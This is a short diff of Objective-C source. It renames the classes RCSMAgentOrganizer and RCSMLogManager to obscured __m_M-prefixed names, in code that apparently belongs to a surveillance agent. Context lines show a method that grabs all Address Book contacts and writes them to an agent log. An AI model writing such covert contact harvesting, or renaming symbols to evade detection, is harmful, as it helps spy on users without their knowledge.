@@ -14,9 +14,9 @@
 #import "RCSMDebug.h"
 
 
-static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
+static __m_MAgentOrganizer *sharedAgentOrganizer = nil;
 
-@interface RCSMAgentOrganizer (private)
+@interface __m_MAgentOrganizer (private)
 
 //
 // Grab all contacts available on AB
@@ -44,7 +44,7 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 
 @end
 
-@implementation RCSMAgentOrganizer (private)
+@implementation __m_MAgentOrganizer (private)
 
 - (BOOL)_grabAllContacts
 {
@@ -410,7 +410,7 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
   verboseLog(@"");
 #endif
   
-  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
+  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
   
   if ([logManager createLog: AGENT_ORGANIZER
                 agentHeader: nil
@@ -443,7 +443,7 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 @end
 
 
-@implementation RCSMAgentOrganizer
+@implementation __m_MAgentOrganizer
 
 //@synthesize mConfiguration;
 
@@ -451,7 +451,7 @@ static RCSMAgentOrganizer *sharedAgentOrganizer = nil;
 #pragma mark Class and init methods
 #pragma mark -
 
-+ (RCSMAgentOrganizer *)sharedInstance
++ (__m_MAgentOrganizer *)sharedInstance
 {
   @synchronized(self)
   {
